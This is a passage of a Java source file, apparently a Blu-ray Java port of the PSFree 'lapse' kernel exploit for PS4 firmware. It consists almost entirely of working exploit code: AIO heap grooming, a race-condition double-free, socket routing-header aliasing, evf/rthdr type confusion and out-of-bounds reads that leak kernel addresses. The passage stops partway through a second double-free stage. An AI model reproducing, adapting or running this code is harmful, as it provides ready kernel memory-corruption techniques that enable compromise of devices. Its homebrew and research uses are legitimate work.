/*
Copyright (C) 2025 Gezine
Copyright (C) 2025 anonymous

This file `Lapse.java` contains a derivative work of `lapse.mjs`, which is a
part of PSFree.

Source:
https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
https://github.com/Al-Azif/psfree-lapse/tree/v1.5.0

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

package org.bdj.external;

import org.bdj.Status;
import org.bdj.api.*;

public class Lapse {
    private static final String VERSION_STRING = "BD-J Lapse 1.2 by Gezine";

    public static final int MAIN_CORE = 4;
    public static final int MAIN_RTPRIO = 0x100;
    public static final int NUM_WORKERS = 2;
    public static final int NUM_GROOMS = 0x200;
    public static final int NUM_SDS = 64;
    public static final int NUM_SDS_ALT = 48;
    public static final int NUM_RACES = 100;
    public static final int NUM_ALIAS = 100;
    public static final int NUM_HANDLES = 0x100;
    public static final int LEAK_LEN = 16;
    public static final int NUM_LEAKS = 16;
    public static final int NUM_CLOBBERS = 8;

    private static int blockFd = -1;
    private static int unblockFd = -1;
    private static int blockId = -1;
    private static int[] groomIds;
    private static int[] sockets;
    private static int[] socketsAlt;
    private static int previousCore = -1;
    private static Kernel.KernelRW kernelRW;

    // Kernel leak results from Stage 2
    private static long reqs1Addr;
    private static long kbufAddr;
    private static long kernelAddr;
    private static int targetId;
    private static int evf;
    private static long fakeReqs3Addr;
    private static int fakeReqs3Sd;
    private static long aioInfoAddr;
    
    private static API api;

    static {
        try {
            api = API.getInstance();
        } catch (Exception e) {
            throw new ExceptionInInitializerError(e);
        }
    }

    // Worker thread for AIO deletion race
    public static class DeleteWorkerThread extends Thread {
        private long requestAddr;
        private Buffer errors;
        private int pipeFd;
        private volatile boolean ready = false;
        private volatile boolean completed = false;
        private volatile int workerError = -1;

        public DeleteWorkerThread(long requestAddr, Buffer errors, int pipeFd) {
            this.requestAddr = requestAddr;
            this.errors = errors;
            this.pipeFd = pipeFd;
        }

        public void run() {
            try {
                ready = true;

                // Block on pipe read
                Buffer pipeBuf = new Buffer(8);
                Helper.syscall(Helper.SYS_READ, (long)pipeFd, pipeBuf.address(), 1L);

                // Execute AIO deletion
                Helper.aioMultiDelete(requestAddr, 1, errors.address() + 4);

                workerError = errors.getInt(4);
                completed = true;

            } catch (Exception e) {
                Status.println("Worker thread error: " + e.getMessage());
                workerError = -1;
                completed = true;
            }
        }

        public boolean isReady() { return ready; }
        public boolean isCompleted() { return completed; }
        public int getWorkerError() { return workerError; }
    }

    // Initialize all classes in proper order
    private static void initializeExploit() {
        try {
            Kernel.initializeKernelOffsets();            
        } catch (Exception e) {
            throw new RuntimeException("Initialization failed", e);
        }
    }

    private static boolean checkCompatibility() {
        boolean hasOffsets = KernelOffset.hasPS4Offsets();

        if (!hasOffsets) {
            Status.println("Not supported firmware");
            return false;
        }
        
        return true;
    }

    public static boolean performSetup() {
        Status.println("=== STAGE 0: Setup ===");

        try {
            // CPU pinning and priority
            previousCore = Helper.getCurrentCore();
            Status.println("Previous core: " + previousCore);

            if (!Helper.pinToCore(MAIN_CORE)) {
                Status.println("Failed to pin to core " + MAIN_CORE);
                return false;
            }

            if (!Helper.setRealtimePriority(MAIN_RTPRIO)) {
                Status.println("Failed to set realtime priority");
                return false;
            }

            Status.println("Pinned to core " + Helper.getCurrentCore() + " with prio " + MAIN_RTPRIO);

            // Create socketpair for blocking
            if (!createSocketPair()) {
                return false;
            }

            // Block AIO workers
            Buffer blockReqs = new Buffer(0x28 * NUM_WORKERS);
            blockReqs.fill((byte)0);

            for (int i = 0; i < NUM_WORKERS; i++) {
                int offset = i * 0x28;
                blockReqs.putInt(offset + 0x08, 1);         // nbyte
                blockReqs.putInt(offset + 0x20, blockFd);   // fd = blockFd
            }

            Buffer blockIdBuf = new Buffer(4);
            long result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, blockReqs.address(), NUM_WORKERS, 
                                             Helper.AIO_PRIORITY_HIGH, blockIdBuf.address());
            if (result != 0) {
                Status.println("Failed to submit blocking AIO: " + result);
                return false;
            }

            blockId = blockIdBuf.getInt(0);
            Status.println("AIO workers blocked with ID: " + blockId);

            // Heap grooming
            int numReqs = 3;
            Buffer groomReqs = Helper.createAioRequests(numReqs);

            groomIds = new int[NUM_GROOMS];
            int validCount = 0;

            for (int i = 0; i < NUM_GROOMS; i++) {
                Buffer singleId = new Buffer(4);
                result = Helper.aioSubmitCmd(Helper.AIO_CMD_READ, groomReqs.address(), numReqs, 
                                           Helper.AIO_PRIORITY_HIGH, singleId.address());
                if (result == 0) {
                    groomIds[i] = singleId.getInt(0);
                    validCount++;
                } else {
                    groomIds[i] = 0;
                }
            }

            Status.println("Submitted " + validCount + " groom AIOs");

            // Cancel grooming AIOs
            cancelGroomAios();

            Status.println("Setup completed successfully");
            return true;
            
        } catch (Exception e) {
            Status.println("Setup failed: " + e.getMessage());
            return false;
        }
    }

    private static boolean createSocketPair() {
        try {
            Buffer sockpair = new Buffer(8);
            long result = Helper.syscall(Helper.SYS_SOCKETPAIR, (long)Helper.AF_UNIX, 
                                       (long)Helper.SOCK_STREAM, 0L, sockpair.address());
            if (result != 0) {
                Status.println("Socketpair creation failed: " + result);
                return false;
            }

            blockFd = sockpair.getInt(0);
            unblockFd = sockpair.getInt(4);

            Status.println("Created socketpair: blockFd=" + blockFd + " unblockFd=" + unblockFd);
            return true;
        } catch (Exception e) {
            Status.println("Failed to create socketpair: " + e.getMessage());
            return false;
        }
    }

    private static void cancelGroomAios() {
        try {
            Buffer errors = new Buffer(4 * Helper.MAX_AIO_IDS);

            for (int i = 0; i < NUM_GROOMS; i += Helper.MAX_AIO_IDS) {
                int batchSize = Math.min(Helper.MAX_AIO_IDS, NUM_GROOMS - i);
                Buffer batchIds = new Buffer(4 * batchSize);

                for (int j = 0; j < batchSize; j++) {
                    batchIds.putInt(j * 4, groomIds[i + j]);
                }

                Helper.aioMultiCancel(batchIds.address(), batchSize, errors.address());
            }
        } catch (Exception e) {
            Status.println("Error canceling groom AIOs: " + e.getMessage());
        }
    }

    // STAGE 1: Double-free reqs2
    public static int[] executeStage1() {
        Status.println("=== STAGE 1: Double-free AIO ===");

        try {
            sockets = new int[NUM_SDS];
            for (int i = 0; i < NUM_SDS; i++) {
                sockets[i] = Helper.createUdpSocket();
            }

            Buffer serverAddr = new Buffer(16);
            serverAddr.fill((byte)0);
            serverAddr.putByte(1, (byte)Helper.AF_INET);
            serverAddr.putShort(2, Helper.htons(5050));
            serverAddr.putInt(4, Helper.aton("127.0.0.1"));

            int listenSd = Helper.createTcpSocket();
            if (listenSd < 0) {
                Status.println("Failed to create listen socket");
                return null;
            }

            // Set SO_REUSEADDR
            Buffer enable = new Buffer(4);
            enable.putInt(0, 1);
            Helper.setSockOpt(listenSd, Helper.SOL_SOCKET, Helper.SO_REUSEADDR, enable, 4);

            // Bind and listen
            long bindResult = Helper.syscall(Helper.SYS_BIND, (long)listenSd, serverAddr.address(), 16L);
            if (bindResult != 0) {
                Status.println("Bind failed: " + bindResult);
                Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
                return null;
            }

            long listenResult = Helper.syscall(Helper.SYS_LISTEN, (long)listenSd, 1L);
            if (listenResult != 0) {
                Status.println("Listen failed: " + listenResult);
                Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
                return null;
            }

            // Main race loop
            int numReqs = 3;
            int whichReq = numReqs - 1;

            for (int attempt = 1; attempt <= NUM_RACES; attempt++) {
                Status.println("Race attempt " + attempt + "/" + NUM_RACES);

                int clientSd = Helper.createTcpSocket();
                if (clientSd < 0) {
                    continue;
                }

                long connectResult = Helper.syscall(Helper.SYS_CONNECT, (long)clientSd, 
                                                   serverAddr.address(), 16L);
                if (connectResult != 0) {
                    Status.println("Connect failed: " + connectResult);
                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
                    continue;
                }

                long connSd = Helper.syscall(Helper.SYS_ACCEPT, (long)listenSd, 0L, 0L);
                if (connSd < 0) {
                    Status.println("Accept failed: " + connSd);
                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
                    continue;
                }

                // Set SO_LINGER to force soclose() delay
                Buffer lingerBuf = new Buffer(8);
                lingerBuf.fill((byte)0);
                lingerBuf.putInt(0, 1);  // l_onoff - linger active
                lingerBuf.putInt(4, 1);  // l_linger - 1 second

                Helper.setSockOpt(clientSd, Helper.SOL_SOCKET, Helper.SO_LINGER, lingerBuf, 8);

                // Create AIO requests
                Buffer reqs = Helper.createAioRequests(numReqs);
                Buffer aioIds = new Buffer(4 * numReqs);

                // Set client socket fd in the target request
                reqs.putInt(whichReq * 0x28 + 0x20, clientSd);

                // Submit AIO requests
                long submitResult = Helper.aioSubmitCmd(Helper.AIO_CMD_MULTI_READ, reqs.address(), 
                                                      numReqs, Helper.AIO_PRIORITY_HIGH, aioIds.address());
                if (submitResult != 0) {
                    Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
                    Helper.syscall(Helper.SYS_CLOSE, connSd);
                    continue;
                }

                Buffer errors = new Buffer(4 * numReqs);
                Helper.aioMultiCancel(aioIds.address(), numReqs, errors.address());
                Helper.aioMultiPoll(aioIds.address(), numReqs, errors.address());

                // Close client socket to trigger fdrop() reference counting
                Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);

                // Execute the race
                long requestAddr = aioIds.address() + (whichReq * 4);
                int[] aliasedPair = raceOne(requestAddr, (int)connSd, sockets);

                // Cleanup remaining AIOs
                Helper.aioMultiDelete(aioIds.address(), numReqs, errors.address());
                Helper.syscall(Helper.SYS_CLOSE, connSd);

                if (aliasedPair != null) {
                    Status.println("SUCCESS: Won race at attempt " + attempt);
                    Status.println("Aliased socket pair: " + aliasedPair[0] + ", " + aliasedPair[1]);
                    Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
                    return aliasedPair;
                }

                if (attempt % 10 == 0) {
                    try {
                        Thread.sleep(10);
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            }

            Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
            Status.println("Error: All race attempts failed");
            return null;

        } catch (Exception e) {
            Status.println("Stage 1 execution error: " + e.getMessage());
            return null;
        }
    }

    private static int[] raceOne(long requestAddr, int tcpSd, int[] testSockets) {
        try {
            Buffer sceErrs = new Buffer(8);
            sceErrs.putInt(0, -1);
            sceErrs.putInt(4, -1);

            // Create pipe for synchronization
            Buffer pipe = new Buffer(8);
            long pipeResult = Helper.syscall(Helper.SYS_SOCKETPAIR, (long)Helper.AF_UNIX, 
                                           (long)Helper.SOCK_STREAM, 0L, pipe.address());
            if (pipeResult != 0) {
                return null;
            }

            int pipeReadFd = pipe.getInt(0);
            int pipeWriteFd = pipe.getInt(4);

            // Start worker thread
            DeleteWorkerThread worker = new DeleteWorkerThread(requestAddr, sceErrs, pipeReadFd);
            worker.start();

            // Wait for worker to be ready
            int waitCount = 0;
            while (!worker.isReady() && waitCount < 1000) {
                Thread.yield();
                waitCount++;
            }
            
            if (!worker.isReady()) {
                Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
                Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);
                return null;
            }

            // Signal worker to proceed
            Buffer pipeBuf = new Buffer(8);
            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, pipeBuf.address(), 1L);

            // Yield once to let worker start, then poll immediately
            Thread.yield();

            // Poll AIO state while worker should be blocked in soclose()
            Buffer pollErr = new Buffer(4);
            Helper.aioMultiPoll(requestAddr, 1, pollErr.address());
            int pollRes = pollErr.getInt(0);

            // Check TCP state
            Buffer infoBuffer = new Buffer(0x100);
            int infoSize = Helper.getSockOpt(tcpSd, Helper.IPPROTO_TCP, Helper.TCP_INFO, infoBuffer, 0x100);
            int tcpState = (infoSize > 0) ? (infoBuffer.getByte(0) & 0xFF) : -1;

            boolean wonRace = false;

            if (pollRes != Helper.SCE_KERNEL_ERROR_ESRCH && tcpState != Helper.TCPS_ESTABLISHED) {
                // Execute main delete
                Helper.aioMultiDelete(requestAddr, 1, sceErrs.address());
                wonRace = true;

                Status.println("RACE WON: pollRes=" + Integer.toHexString(pollRes) +
                              " (!=0x80020003), tcpState=" + tcpState + " (!=4)");
            }

            // Wait for worker to complete
            try {
                worker.join(2000);
            } catch (InterruptedException e) {
                // Continue
            }

            // Check race results
            if (wonRace && worker.isCompleted()) {
                int mainError = sceErrs.getInt(0);
                int workerError = worker.getWorkerError();

                Status.println("Race errors: main=" + mainError + ", worker=" + workerError);

                // Both errors must be equal and 0 for successful double-free
                if (mainError == workerError && mainError == 0) {
                    int[] aliasedPair = makeAliasedRthdrs(testSockets);
                    
                    if (aliasedPair != null) {
                        Status.println("Socket aliasing verified - memory corruption confirmed!");

                        Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
                        Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);

                        return aliasedPair;
                        
                    } else {
                        Status.println("Socket aliasing failed - double-free didn't cause expected corruption");
                    }
                } else {
                    Status.println("Double-free NOT achieved - error mismatch or non-zero errors");
                    Status.println("Expected: both errors = 0, Got: main=" + mainError + ", worker=" + workerError);
                }
            } else if (wonRace && !worker.isCompleted()) {
                Status.println("Race condition detected but worker not completed - timing issue");
            }

            Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
            Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);

            return null;

        } catch (Exception e) {
            Status.println("Race execution error: " + e.getMessage());
            return null;
        }
    }

    public static int[] makeAliasedRthdrs(int[] sds) {
        int markerOffset = 4;
        int size = 0x80;
        Buffer buf = new Buffer(size);
        int rsize = Helper.buildRoutingHeader(buf, size);

        for (int loop = 1; loop <= NUM_ALIAS; loop++) {

            for (int i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
                if (sds[i-1] >= 0) {
                    buf.putInt(markerOffset, i);
                    Helper.setRthdr(sds[i-1], buf, rsize);
                }
            }

            for (int i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
                if (sds[i-1] >= 0) {
                    Helper.getRthdr(sds[i-1], buf, size);
                    int marker = buf.getInt(markerOffset);
                    
                    if (marker != i && marker > 0 && marker <= NUM_SDS) {
                        int aliasedIdx = marker - 1;
                        if (aliasedIdx >= 0 && aliasedIdx < sds.length && sds[aliasedIdx] >= 0) {
                            Status.println("Aliased rthdrs at attempt: " + loop +
                                          " (found pair: " + sds[i-1] + " " + sds[aliasedIdx] + ")");

                            int[] sdPair = new int[2];
                            sdPair[0] = sds[i-1];
                            sdPair[1] = sds[aliasedIdx];

                            Helper.removeSocketFromArray(sds, Math.max(i-1, aliasedIdx));
                            Helper.removeSocketFromArray(sds, Math.min(i-1, aliasedIdx));
                            Helper.freeRthdrs(sds);
                            
                            Helper.addSocketToArray(sds, Helper.createUdpSocket());
                            Helper.addSocketToArray(sds, Helper.createUdpSocket());

                            return sdPair;
                        }
                    }
                }
            }
        }

        return null;
        
    }

    public static int[] makeAliasedPktopts(int[] sds) {
        Buffer tclass = new Buffer(4);

        int validSockets = 0;
        for (int i = 0; i < sds.length; i++) {
            if (sds[i] >= 0) {
                validSockets++;
            }
        }
        
        if (validSockets < 2) {
            Status.println("Error: Not enough valid sockets for aliasing: " + validSockets);
            return null;
        }

        for (int loop = 1; loop <= NUM_ALIAS; loop++) {
            int markersSet = 0;
            for (int i = 1; i <= sds.length; i++) {
                if (sds[i-1] >= 0) {
                    tclass.putInt(0, i);
                    Helper.setSockOpt(sds[i-1], Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
                    markersSet++;
                }
            }
            
            if (markersSet == 0) {
                Status.println("Error: No markers could be set, aborting");
                break;
            }

            for (int i = 1; i <= sds.length; i++) {
                if (sds[i-1] >= 0) {
                    Helper.getSockOpt(sds[i-1], Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
                    int marker = tclass.getInt(0);
                    
                    if (marker != i && marker > 0 && marker <= sds.length) {
                        int aliasedIdx = marker - 1;
                        if (aliasedIdx >= 0 && aliasedIdx < sds.length && sds[aliasedIdx] >= 0) {
                            Status.println("Aliased pktopts at attempt: " + loop + " (found pair: " + sds[i-1] + " " + sds[aliasedIdx] + ")");

                            int[] sdPair = new int[2];
                            sdPair[0] = sds[i-1];
                            sdPair[1] = sds[aliasedIdx];
                            
                            Helper.removeSocketFromArray(sds, Math.max(i-1, aliasedIdx));
                            Helper.removeSocketFromArray(sds, Math.min(i-1, aliasedIdx));
                            
                            for (int j = 0; j < 2; j++) {
                                int sockFd = Helper.createUdpSocket();
                                Helper.setSockOpt(sockFd, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
                                Helper.addSocketToArray(sds, sockFd);
                            }
                            return sdPair;
                        }
                    }
                }
            }

            for (int i = 0; i < sds.length; i++) {
                if (sds[i] >= 0) {
                    Helper.setSockOpt(sds[i], Helper.IPPROTO_IPV6, Helper.IPV6_2292PKTOPTIONS, new Buffer(1), 0);
                }
            }
        }

        Status.println("Error: makeAliasedPktopts failed after " + NUM_ALIAS + " attempts");
        return null;
    }

    public static boolean verifyReqs2(Buffer buf, int offset, int cmd) {
        try {
            // reqs2.ar2_cmd
            int actualCmd = buf.getInt(offset);
            if (actualCmd != cmd) {
                return false;
            }

            // heap_prefixes array to track common heap address prefixes
            int[] heapPrefixes = new int[8];
            int prefixCount = 0;

            // Check if offsets 0x10 to 0x20 look like kernel heap addresses
            for (int i = 0x10; i <= 0x20; i += 8) {
                short highWord = buf.getShort(offset + i + 6);
                if (highWord != (short)0xffff) {
                    return false;
                }
                if (prefixCount < heapPrefixes.length) {
                    heapPrefixes[prefixCount++] = buf.getShort(offset + i + 4) & 0xffff;
                }
            }

            // Check reqs2.ar2_result.state
            int state1 = buf.getInt(offset + 0x38);
            int state2 = buf.getInt(offset + 0x38 + 4);
            if (!(state1 > 0 && state1 <= 4) || state2 != 0) {
                return false;
            }

            // reqs2.ar2_file must be NULL
            long filePtr = buf.getLong(offset + 0x40);
            if (filePtr != 0) {
                return false;
            }

            // Check if offsets 0x48 to 0x50 look like kernel addresses
            for (int i = 0x48; i <= 0x50; i += 8) {
                short highWord = buf.getShort(offset + i + 6);
                if (highWord == (short)0xffff) {
                    short midWord = buf.getShort(offset + i + 4);
                    if (midWord != (short)0xffff && prefixCount < heapPrefixes.length) {
                        heapPrefixes[prefixCount++] = midWord & 0xffff;
                    }
                } else if ((i == 0x48) || (buf.getLong(offset + i) != 0)) {
                    return false;
                }
            }

            if (prefixCount < 2) {
                return false;
            }

            // Check that heap prefixes are consistent
            int firstPrefix = heapPrefixes[0];
            for (int i = 1; i < prefixCount; i++) {
                if (heapPrefixes[i] != firstPrefix) {
                    return false;
                }
            }

            return true;
        } catch (Exception e) {
            Status.println("Error in verifyReqs2: " + e.getMessage());
            return false;
        }
    }

    // STAGE 2: Leak kernel addresses
    public static boolean executeStage2(int[] aliasedPair) {
        Status.println("=== STAGE 2: Leak kernel addresses ===");

        try {
            int sd = aliasedPair[0];
            int bufLen = 0x80 * LEAK_LEN;
            Buffer buf = new Buffer(bufLen);

            // Type confuse a struct evf with a struct ip6_rthdr
            Status.println("Confuse evf with rthdr");

            Buffer name = new Buffer(1);

            // Free one of rthdr
            Helper.syscall(Helper.SYS_CLOSE, (long)aliasedPair[1]);

            evf = -1;

            for (int i = 1; i <= NUM_ALIAS; i++) {
                int[] evfs = new int[NUM_HANDLES];

                // Reclaim freed rthdr with evf object
                for (int j = 0; j < NUM_HANDLES; j++) {
                    int evfFlags = 0xf00 | ((j + 1) << 16);
                    evfs[j] = Helper.createEvf(name.address(), evfFlags);
                }

                Helper.getRthdr(sd, buf, 0x80);

                int flag = buf.getInt(0);

                if ((flag & 0xf00) == 0xf00) {
                    int idx = (flag >>> 16);
                    int expectedFlag = flag | 1;
                    
                    if (idx >= 1 && idx <= evfs.length) {
                        evf = evfs[idx - 1];

                        Helper.setEvfFlags(evf, expectedFlag);
                        Helper.getRthdr(sd, buf, 0x80);

                        int val = buf.getInt(0);
                        if (val == expectedFlag) {
                            // Success - keep this EVF
                        } else {
                            evf = -1;  // Reset on failure
                        }
                    } else {
                        Status.println("EVF idx out of range: " + idx);
                    }
                }

                // Free all EVFs except the found one
                for (int j = 0; j < NUM_HANDLES; j++) {
                    if (evfs[j] != evf && evfs[j] >= 0) {
                        try {
                            Helper.freeEvf(evfs[j]);
                        } catch (Exception e) {
                            // Continue if EVF free fails
                        }
                    }
                }

                if (evf != -1) {
                    Status.println("Confused rthdr and evf at attempt: " + i);
                    break;
                }
            }

            if (evf == -1) {
                throw new RuntimeException("Failed to confuse evf and rthdr");
            }

            // Enlarge ip6_rthdr by writing to its len field by setting the evf's flag
            Helper.setEvfFlags(evf, 0xff << 8);

            // evf.cv.cv_description = "evf cv" - string is located at the kernel's mapped ELF file
            kernelAddr = buf.getLong(0x28);
            Status.println("\"evf cv\" string addr: " + Long.toHexString(kernelAddr));

            // evf.waiters.tqh_last == &evf.waiters.tqh_first
            kbufAddr = buf.getLong(0x40) - 0x38;
            Status.println("Kernel buffer addr: " + Long.toHexString(kbufAddr));

            // Prep to fake reqs3 (aio_batch)
            int wbufsz = 0x80;
            Buffer wbuf = new Buffer(wbufsz);
            int rsize = Helper.buildRoutingHeader(wbuf, wbufsz);
            int markerVal = 0xdeadbeef;
            int reqs3Offset = 0x10;

            wbuf.putInt(4, markerVal);
            wbuf.putInt(reqs3Offset + 0, 1);  // .ar3_num_reqs
            wbuf.putInt(reqs3Offset + 4, 0);  // .ar3_reqs_left
            wbuf.putInt(reqs3Offset + 8, Helper.AIO_STATE_COMPLETE);  // .ar3_state
            wbuf.putByte(reqs3Offset + 0xc, (byte)0);  // .ar3_done
            wbuf.putInt(reqs3Offset + 0x28, 0x67b0000);  // .ar3_lock.lock_object.lo_flags
            wbuf.putLong(reqs3Offset + 0x38, 1L);  // .ar3_lock.lk_lock = LK_UNLOCKED

            // Prep to leak reqs2 (aio_entry)
            int numElems = 6;
            long ucred = kbufAddr + 4;
            Buffer leakReqs = Helper.createAioRequests(numElems);
            leakReqs.putLong(0x10, ucred);  // .ai_cred

            int numLoop = NUM_SDS;
            int leakIdsLen = numLoop * numElems;
            Buffer leakIds = new Buffer(4 * leakIdsLen);
            int step = 4 * numElems;
            int cmd = Helper.AIO_CMD_FLAG_MULTI | Helper.AIO_CMD_WRITE;

            long reqs2Off = -1;
            long fakeReqs3Off = -1;
            fakeReqs3Sd = -1;

            for (int i = 1; i <= NUM_LEAKS; i++) {

                // Spray reqs2 and rthdr with fake reqs3
                for (int j = 1; j <= numLoop; j++) {
                    wbuf.putInt(8, j);
                    Helper.aioSubmitCmd(cmd, leakReqs.address(), numElems, Helper.AIO_PRIORITY_HIGH, leakIds.address() + ((j-1) * step));
                    Helper.setRthdr(sockets[j-1], wbuf, rsize);
                }

                // Out of bound read on adjacent malloc 0x80 memory
                Helper.getRthdr(sd, buf, bufLen);

                int sdIdx = -1;
                reqs2Off = -1;
                fakeReqs3Off = -1;

                // Search starting from 0x80, not 0
                for (int off = 0x80; off < bufLen; off += 0x80) {
                    // Check for reqs2 with correct command
                    if (reqs2Off == -1 && verifyReqs2(buf, off, Helper.AIO_CMD_WRITE)) {
                        reqs2Off = off;
                    }

                    // Check for fake reqs3
                    if (fakeReqs3Off == -1) {
                        int marker = buf.getInt(off + 4);
                        if (marker == markerVal) {
                            fakeReqs3Off = off;
                            sdIdx = buf.getInt(off + 8);
                        }
                    }
                }

                if (reqs2Off != -1 && fakeReqs3Off != -1) {
                    Status.println("Found reqs2 and fake reqs3 at attempt: " + i);
                    if (sdIdx > 0 && sdIdx <= sockets.length) {
                        fakeReqs3Sd = sockets[sdIdx - 1];

                        Helper.removeSocketFromArray(sockets, sdIdx - 1);
                        Helper.addSocketToArray(sockets, Helper.createUdpSocket());
                        
                        Helper.freeRthdrs(sockets);
                        break;
                    }
                }

                // Free AIOs before next attempt
                Helper.freeAios(leakIds.address(), leakIdsLen, false);
            }

            if (reqs2Off == -1 || fakeReqs3Off == -1) {
                throw new RuntimeException("Could not leak reqs2 and fake reqs3");
            }
            
            Status.println("reqs2 offset: " + Integer.toHexString((int)reqs2Off));
            Status.println("fake reqs3 offset: " + Integer.toHexString((int)fakeReqs3Off));

            Helper.getRthdr(sd, buf, bufLen);

            Status.println("Leaked aio_entry:");
            
            for (int i = 0; i < 0x80; i += 16) {
                StringBuffer sb = new StringBuffer();
                sb.append(Helper.toHexString(i, 8));
                sb.append(": ");
                for (int j = 0; j < 16 && (i + j) < 0x80; j++) {
                    int byteVal = buf.getByte((int)reqs2Off + i + j) & 0xff;
                    sb.append(Helper.toHexString(byteVal, 2));
                    sb.append(" ");
                }
                Status.println(sb.toString());
            }

            aioInfoAddr = buf.getLong((int)reqs2Off + 0x18);

            reqs1Addr = buf.getLong((int)reqs2Off + 0x10);
            reqs1Addr = reqs1Addr & (~0xffL);

            fakeReqs3Addr = kbufAddr + fakeReqs3Off + reqs3Offset;

            Status.println("reqs1_addr = " + Long.toHexString(reqs1Addr));
            Status.println("fake_reqs3_addr = " + Long.toHexString(fakeReqs3Addr));

            Status.println("Searching target_id");

            targetId = -1;
            long toCancel = -1;
            int toCancelLen = -1;

            for (int i = 0; i < leakIdsLen; i += numElems) {
                Helper.aioMultiCancel(leakIds.address() + i*4, numElems, Helper.AIO_ERRORS.address());
                Helper.getRthdr(sd, buf, bufLen);

                int state = buf.getInt((int)reqs2Off + 0x38);
                if (state == Helper.AIO_STATE_ABORTED) {
                    targetId = leakIds.getInt(i*4);
                    leakIds.putInt(i*4, 0);

                    Status.println("Found target_id=" + Integer.toHexString(targetId) +
                    ", i=" + i + ", batch=" + (i / numElems));

                    int start = i + numElems;
                    toCancel = leakIds.address() + start*4;
                    toCancelLen = leakIdsLen - start;

                    break;
                }
            }

            if (targetId == -1) {
                throw new RuntimeException("Target id not found");
            }

            Helper.cancelAios(toCancel, toCancelLen);
            Helper.freeAios(leakIds.address(), leakIdsLen, false);

            return true;

        } catch (Exception e) {
            Status.println("Stage 2 execution error: " + e.getMessage());
            return false;
        }
    }

    // STAGE 3: Double free reqs1
    public static int[] executeStage3(int aliasedSd) {
        Status.println("=== STAGE 3: Double free SceKernelAioRWRequest ===");
        
        int maxLeakLen = (0xff + 1) << 3;
        Buffer buf = new Buffer(maxLeakLen);

        int numElems = Helper.MAX_AIO_IDS;
        Buffer aioReqs = Helper.createAioRequests(numElems);

        int numBatches = 2;
        int aioIdsLen = numBatches * numElems;
        Buffer aioIds = new Buffer(4 * aioIdsLen);

        Status.println("Start overwrite rthdr with AIO queue entry loop");
        boolean aioNotFound = true;
        
        Helper.freeEvf(evf);

        for (int i = 1; i <= NUM_CLOBBERS; i++) {
            sprayAio(numBatches, aioReqs.address(), numElems, aioIds.address(), true, Helper.AIO_CMD_READ);

            int sizeRet = Helper.getRthdr(aliasedSd, buf, maxLeakLen);
            int cmd = buf.getInt(0);

            if (sizeRet == 8 && cmd == Helper.AIO_CMD_READ) {
                Status.println("Aliased at attempt: " + i);
                aioNotFound = false;
                Helper.cancelAios(aioIds.address(), aioIdsLen);
                break;
            }

            Helper.freeAios(aioIds.address(), aioIdsLen, true);
        }

        if (aioNotFound) {
            Status.println("Failed to overwrite rthdr");
            return null;
        }

        int reqs2Size = 0x80;
        Buffer reqs2 = new Buffer(reqs2Size);
        reqs2.fill((byte)0);
        
        int rsize = Helper.buildRoutingHeader(reqs2, reqs2Size);

        reqs2.putInt(4, 5);  // .ar2_ticket
        reqs2.putLong(0x18, reqs1Addr);  // .ar2_info
        reqs2.putLong(0x20, fakeReqs3Addr);  // .ar2_batch

        Buffer states = new Buffer(4 * numElems);
        long[] addrCache = new long[numBatches];
        for (int i = 0; i < numBatches; i++) {
            addrCache[i] = aioIds.address() + (i * numElems * 4);
        }

        Status.println("Start overwrite AIO queue entry with rthdr loop");
        
        Helper.syscall(Helper.SYS_CLOSE, (long)aliasedSd);
        
        int reqId = overwriteAioEntryWithRthdr(sockets, reqs2, rsize, addrCache, numElems, states, aioIds.address());
        
        if (reqId == -1) {
            Status.println("Failed to overwrite AIO queue entry");
            return null;
        }

        Helper.freeAios(aioIds.address(), aioIdsLen, false);

        Buffer targetIdBuf = new Buffer(4);
        targetIdBuf.putInt(0, targetId);
        
        Helper.aioMultiPoll(targetIdBuf.address(), 1, states.address());
        Status.println("Target's state: " + Integer.toHexString(states.getInt(0)));

        Status.println("Freeing all pktopts to prepare 0x100 zone for reclaim");
        int pktoptsFreed = 0;
        for (int i = 0; i < socketsAlt.length; i++) {
            if (socketsAlt[i] >= 0) {
                try {
                    Helper.setSockOpt(socketsAlt[i], Helper.IPPROTO_IPV6, Helper.IPV6_2292PKTOPTIONS, new Buffer(1), 0);
                    pktoptsFreed++;
                } catch (Exception e) {
                    Status.println("Pktopts free failed for socket " + socketsAlt[i] + ": " + e.getMessage());
                }
            }
        }
        Status.println("Pktopts freed: " + pktoptsFreed + "/" + socketsAlt.length);

        Buffer sceErrs = new Buffer(8);
        sceErrs.putInt(0, -1);
        sceErrs.putInt(4, -1);

        Buffer targetIds = new Buffer(8);
        targetIds.putInt(0, reqId);
        targetIds.putInt(4, targetId);

        Status.println("Executing double-free: req_id=" + Integer.toHexString(reqId) + ", target_id=" + Integer.toHexString(targetId));

        Helper.aioMultiDelete(targetIds.address(), 2, sceErrs.address());
        
